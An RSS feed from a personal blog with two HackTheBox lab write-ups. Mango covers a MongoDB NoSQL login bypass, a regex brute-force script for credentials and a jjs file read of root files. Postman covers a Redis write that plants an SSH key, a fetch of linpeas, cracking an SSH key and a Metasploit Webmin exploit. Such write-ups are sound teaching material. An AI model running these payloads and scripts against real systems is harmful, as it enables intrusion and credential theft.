<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on ajdintrejic</title>
        <link>https://ajdintrejic.github.io/posts/</link>
        <description>Recent content in Posts on ajdintrejic</description>
        <generator>Hugo -- gohugo.io</generator>
        <lastBuildDate>Sat, 18 Apr 2020 13:28:11 +0200</lastBuildDate>
        <atom:link href="https://ajdintrejic.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>HackTheBox :: Mango Write Up</title>
            <link>https://ajdintrejic.github.io/posts/2020/04/hackthebox-mango-write-up/</link>
            <pubDate>Sat, 18 Apr 2020 13:28:11 +0200</pubDate>
            
            <guid>https://ajdintrejic.github.io/posts/2020/04/hackthebox-mango-write-up/</guid>
            <description>This is a write-up of HackTheBox Mango. Contact me on Twitter (@ajdintrejic) if you have any questions
Reconnaissance Let’s run nmap,
sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162 We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.
Getting user account I checked the /robots.txt, also ran gobuster, nothing useful there.</description>
            <content type="html"><![CDATA[<p><img src="/htb-mango/mango_info_card.png" alt="infocard"></p>
<p>This is a write-up of HackTheBox Mango.
Contact me on Twitter (@ajdintrejic) if you have any questions</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>Let’s run nmap,</p>
<pre><code>sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.162
</code></pre><p><img src="/htb-mango/nmap_initial_results.png" alt="nmap"></p>
<p>We have to use https for this website on port 80, and we can get this “search page”. We can see some kind of analytics page in the top right corner.</p>
<p><img src="/htb-mango/mango_search_page.png" alt="page"></p>
<p><img src="/htb-mango/mango_analytics_page.png" alt="page"></p>
<h2 id="getting-user-account">Getting user account</h2>
<p>I checked the /robots.txt, also ran gobuster, nothing useful there. The SSL certificate wasn’t valid so I took a look a there and we have a page reference:
staging-order.mango.htb</p>
<p><img src="/htb-mango/ssl_certificate.png" alt="ssl"></p>
<p>The page is inaccessible, but we can use the /etc/hosts file to redirect the page back to the server itself. You could also change the headers of the https request and change the host value to “staging-order.mango.htb”.</p>
<p>We have multiple server running on the same machine and port (Vhost - virtual hosts) so that is why when we change the host value, we access a “different” server.</p>
<p>Now I added the line to /etc/hosts so the hostname is translated to the correct IP address.</p>
<p><img src="/htb-mango/etc_hosts.png" alt="hosts"></p>
<h3 id="nosql-injection">NoSQL injection</h3>
<p>Now we have a login page here, I spent around 4 hours here as this wasn’t something I had experience with. We have to perform an authentication bypass.</p>
<p><img src="/htb-mango/login_mongodb.png" alt="login"></p>
<p>The login is handeld by MongoDB in the background. How do I know this? The full nmap scan has recognized a MongoDB instance. MondoDB is a NoSQL database, unlike PostgreSQL, which is an SQL database. We need to perform a NoSQL injection attack.</p>
<p>I opened the network tab in Firefox and tried to login with “admin” and “test”. This will send a POST request. We can open it and see the request body.</p>
<p><img src="/htb-mango/network_tab.png" alt="network"></p>
<p><img src="/htb-mango/request.png" alt="request"></p>
<p>Edit the request:</p>
<p>Before:</p>
<pre><code>username=admin&amp;password=test&amp;login=login
</code></pre><p>After:</p>
<pre><code>username=admin&amp;password[$ne]=test&amp;login=login
</code></pre><p>This will trick Mongo to check if the password doesn’t match and if it doesn’t it will let me in.</p>
<p><img src="/htb-mango/request_reply.png" alt="reply"></p>
<p><img src="/htb-mango/after_login.png" alt="afterlogin"></p>
<h3 id="bruteforcing-the-password">Bruteforcing the password</h3>
<p>We can’t do anything from the webpage so I tried to brute-force the password. <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">Here</a> I have found a nice script. It uses regular expressions to try to match the password. The code is fairly simple so I won’t be explaining that.</p>
<p>You should change the cookie ID.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">import</span> requests
<span style="color:#fff;font-weight:bold">import</span> stringurl = <span style="color:#0ff;font-weight:bold">&#34;http://example.com&#34;</span>
headers = {<span style="color:#0ff;font-weight:bold">&#34;Host&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;exmaple.com&#34;</span>}
cookies = {<span style="color:#0ff;font-weight:bold">&#34;PHPSESSID&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;s3gcsgtqre05bah2vt6tibq8lsdfk&#34;</span>}
possible_chars = <span style="color:#fff;font-weight:bold">list</span>(string.ascii_letters) + <span style="color:#fff;font-weight:bold">list</span>(string.digits) + [<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>+c <span style="color:#fff;font-weight:bold">for</span> c in string.punctuation+string.whitespace ]<span style="color:#fff;font-weight:bold">def</span> get_password(username):
    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Extracting password of &#34;</span>+username)
    params = {<span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>:username, <span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>}
    password = <span style="color:#0ff;font-weight:bold">&#34;^&#34;</span>
    <span style="color:#fff;font-weight:bold">while</span> True:
        <span style="color:#fff;font-weight:bold">for</span> c in possible_chars:
            params[<span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>] = password + c + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(pr.status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
                password += c
                <span style="color:#fff;font-weight:bold">break</span>
        <span style="color:#fff;font-weight:bold">if</span> c == possible_chars[-<span style="color:#ff0;font-weight:bold">1</span>]:
            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found password &#34;</span>+password[<span style="color:#ff0;font-weight:bold">1</span>:].replace(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>)+<span style="color:#0ff;font-weight:bold">&#34; for username &#34;</span>+username)
            <span style="color:#fff;font-weight:bold">return</span> password[<span style="color:#ff0;font-weight:bold">1</span>:].replace(<span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\\</span><span style="color:#0ff;font-weight:bold">&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>)<span style="color:#fff;font-weight:bold">def</span> get_usernames():
    usernames = []
    params = {<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;password[$regex]&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;login&#34;</span>}
    <span style="color:#fff;font-weight:bold">for</span> c in possible_chars:
        username = <span style="color:#0ff;font-weight:bold">&#34;^&#34;</span> + c
        params[<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>] = username + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(pr.status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found username starting with &#34;</span>+c)
            <span style="color:#fff;font-weight:bold">while</span> True:
                <span style="color:#fff;font-weight:bold">for</span> c2 in possible_chars:
                    params[<span style="color:#0ff;font-weight:bold">&#34;username[$regex]&#34;</span>] = username + c2 + <span style="color:#0ff;font-weight:bold">&#34;.*&#34;</span>
                    <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">int</span>(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == <span style="color:#ff0;font-weight:bold">302</span>:
                        username += c2
                        <span style="color:#fff;font-weight:bold">print</span>(username)
                        breakif c2 == possible_chars[-<span style="color:#ff0;font-weight:bold">1</span>]:
                    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Found username: &#34;</span>+username[<span style="color:#ff0;font-weight:bold">1</span>:])
                    usernames.append(username[<span style="color:#ff0;font-weight:bold">1</span>:])
                    <span style="color:#fff;font-weight:bold">break</span>
    <span style="color:#fff;font-weight:bold">return</span> usernamesfor u in get_usernames():
    get_password(u)
</code></pre></div><p>This will run for some time, the output is:</p>
<p><img src="/htb-mango/password_bruteforce.png" alt="success"></p>
<pre><code>admin:t9KcS3&gt;!0B#2
mango:h3mXK8RhU~f{]f5H
</code></pre><p>I couldn&rsquo;t SSH into admin but I could SSH into mango, switch user to admin and cat user.txt.</p>
<p><img src="/htb-mango/user_txt.png" alt="usertxt"></p>
<h2 id="getting-root-account">Getting root account</h2>
<p>First, I switch from sh to bash by running /bin/bash.</p>
<p>I transfered linenum.sh on the server and checked the output. There was an interesting file with SUID bit set to 1:</p>
<p><img src="/htb-mango/jjs.png" alt="jjs"></p>
<h3 id="privilege-escalation-with-jjs">Privilege escalation with JJS</h3>
<p>This is usually used for privilege escalation, so when you run jjs you get some sort of shell, let’s check GTFOBin if we can escape. There is a file read exploit so I’ll use that (note: you have to change the file name and remove the “newline symbols” ):</p>
<pre><code>echo 'var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;); var FileReader = Java.type(&quot;java.io.FileReader&quot;); var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;)); while ((line = br.readLine()) != null) { print(line); }' | jjs
</code></pre><p><img src="/htb-mango/root_txt.png" alt="roottxt"></p>
<p>Thanks for reading! Make sure to follow me on Twitter @ajdintrejic.</p>
]]></content>
        </item>
        
        <item>
            <title>HackTheBox :: Postman Write Up</title>
            <link>https://ajdintrejic.github.io/posts/2020/03/hackthebox-postman-write-up/</link>
            <pubDate>Fri, 13 Mar 2020 13:28:11 +0200</pubDate>
            
            <guid>https://ajdintrejic.github.io/posts/2020/03/hackthebox-postman-write-up/</guid>
            <description>Reconnaissance Let’s run a quick nmap scan as always.
# nmap -sV -sC -O -oA nmap/initial 10.10.10.160 Short explanation:
-sV Version detection -sC Script scan -O Enable OS detection -oA Output to all formats For a more detailed explanation click here.
While I wait for this to be finished I’ll start a full nmap scan.
# nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160 As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</description>
            <content type="html"><![CDATA[<h2 id="reconnaissance">Reconnaissance</h2>
<p>Let’s run a quick nmap scan as always.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#007f7f"># nmap -sV -sC -O -oA nmap/initial 10.10.10.160</span>
</code></pre></div><p>Short explanation:</p>
<pre><code>-sV Version detection
-sC Script scan
-O  Enable OS detection 
-oA Output to all formats
</code></pre><p>For a more detailed explanation <a href="https://explainshell.com/explain?cmd=nmap+-sV+-sC+-O+-oA+nmap%2Finitial+10.10.10.160#">click here</a>.</p>
<p>While I wait for this to be finished I’ll start a full nmap scan.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#007f7f"># nmap -sV -sC -O -p- -oA nmap/initial 10.10.10.160</span>
</code></pre></div><p><img src="/htb-postman/nmap_initial.png" alt="nmap initial"></p>
<p>As usual we have port 22 and port 80 running, but here we also have http protocol running on port 10000, let’s enumerate on those pages.</p>
<p><img src="/htb-postman/port80.png" alt="port80"></p>
<p><img src="/htb-postman/port10000_1.png" alt="port80"></p>
<p>Now on the second server I have to add a “s” to my http request so I can access that.</p>
<p><img src="/htb-postman/port10000_2.png" alt="port80"></p>
<p>I’ll also start up gobuster. On port 10000 every page link loads the same login so gobuster doesn’t help us there. Let’s run it on port 80.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.160 -x php,html -t <span style="color:#ff0;font-weight:bold">100</span>
</code></pre></div><p><img src="/htb-postman/gobuster.png" alt="gobuster"></p>
<p>Now I felt kinda lost so I looked into what did the full nmap scan find.</p>
<p><img src="/htb-postman/nmap_full.png" alt="nmap full"></p>
<h2 id="getting-user-account">Getting user account</h2>
<h3 id="redis-file-write">Redis file write</h3>
<p>So we have something called Redis here running. I tried to find some explanation to what is it and how to exploit it, Google found this.</p>
<blockquote>
<p>The Redis security model is: “it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself”.</p>
</blockquote>
<p>So we’re on the right track. The developer guides us for the next steps on how to exploit this. Using <code>telnet</code> we can see now that we can connect to the machine easily:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.160 <span style="color:#ff0;font-weight:bold">6379</span>
</code></pre></div><p>We don’t have a real shell here but we can write some files. We’ll write our own ssh keys. Let’s generate them.</p>
<p><img src="/htb-postman/ssh_keygen.png" alt="nmap full"></p>
<p>We will push the key and pad it before and after. Why? Well we’ll push it to Redis memory and then flush the memory to a file. The memory will contain a lot of garbage and we’re hoping ssh will parse the file, ignore the garbage and correctly read our key.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ (<span style="color:#fff;font-weight:bold">echo</span> -e <span style="color:#0ff;font-weight:bold">&#34;\n\n&#34;</span>; cat id_rsa.pub; <span style="color:#fff;font-weight:bold">echo</span> -e <span style="color:#0ff;font-weight:bold">&#34;\n\n&#34;</span>) &gt; foo.txt
</code></pre></div><p>Now foo.txt is just our public key but with newlines. We can write this string inside the memory of Redis using <code>redis-cli</code>:</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 10.10.10.160 flushall
$ cat foo.txt | redis-cli -h 10.10.10.160 -x <span style="color:#fff;font-weight:bold">set</span> crackit
</code></pre></div><p>Looks good. How to dump our memory content into the <code>authorized_keys</code> file? You can see what have I done in picture below.</p>
<p><img src="/htb-postman/redis.png" alt="redis"></p>
<p>Now that we’ve got a shell, we can see by running</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/passwd
</code></pre></div><p>that we have to gain access to Matt’s account.</p>
<p>We can’t run anything as sudo and we don’t belong in any special groups. I searched the redis dir but there wasn’t anything we could work with, I went into <code>/var</code> and checked every folder and again, nothing we can work with. Let’s pull the big guns out. Big guns being LinPEAS. Let’s transfer them onto the server.</p>
<p>Clone the repo to your machine, enter the <code>/linPEAS dir</code> and start an http server from there. I used port 1114.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo python -m SimpleHTTPServer <span style="color:#ff0;font-weight:bold">1114</span>
</code></pre></div><p>Now, navigate to <code>/tmp</code> and create a dir there and cd into it (e.g. <code>/tmp/1234</code>), then grab the file from the machine.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget &lt;your ip here&gt;:1114/linpeas.sh
</code></pre></div><p>Now I ran the script and spent some time looking at the output. This took some time but there is a <code>id_rsa.bak</code> file.</p>
<p><img src="/htb-postman/id_rsa_bak.png" alt="id rsa bak"></p>
<h3 id="cracking-ssh-key-with-john">Cracking ssh key with John</h3>
<p>Simply pipe this into ssh2john.py and crack it with the rockyou.txt wordlist.</p>
<p><img src="/htb-postman/john.png" alt="john"></p>
<p>I tried to ssh into the server with this key but no success. So I connected again as redis and ran</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su Matt
</code></pre></div><p>And that’s how I got user</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Matt@Postman:~$ cat user.txt 
517ad...
</code></pre></div><h2 id="getting-root">Getting root</h2>
<p>Getting root is pretty easy, I just logged into webmin with <code>Matt</code> and <code>computer2008</code>. In there I couldn’t do anything, but we can see a notification that we have to update the software.</p>
<h3 id="webmin-privilege-escalation">Webmin privilege escalation</h3>
<p>I found an exploit on Metasploit and used it. Below are highlighted the options which are changed. Make sure to switch the payload as the default one didn’t work. I always have success in using the python one.</p>
<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt; show payloads
 &gt; <span style="color:#fff;font-weight:bold">set</span> payload &lt;payload here&gt;
</code></pre></div><p><img src="/htb-postman/metasploit.png" alt="metasploit"></p>
<p>After this you can simply type <code>exploit</code> and you should have a shell as root and you can <code>cat root.txt</code>.</p>
]]></content>
        </item>
        
    </channel>
</rss>
